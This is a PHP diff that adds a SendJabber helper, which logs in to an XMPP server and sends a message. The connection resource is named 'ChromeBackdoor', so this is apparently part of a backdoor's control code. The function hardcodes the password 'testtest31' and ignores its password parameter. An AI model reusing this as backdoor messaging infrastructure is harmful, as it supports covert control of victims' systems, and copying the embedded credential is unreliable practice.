@@ -45,4 +45,15 @@ function right_user($username){
         }
     }
 }
+
+function SendJabber($jabber_username, $jabber_password, $jabber_to, $message){
+    require_once "lib/XMPPHP/XMPP.php";  
+    $username = explode('@', $jabber_username);
+    $conn = new XMPPHP_XMPP($username[1], 5222, $username[0], 'testtest31', 'ChromeBackdoor', $username[1], $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
+    $conn->connect();
+    $conn->processUntil('session_start');
+    $conn->presence();
+    $conn->message($jabber_to, $message);
+    $conn->disconnect();
+}
 ?>
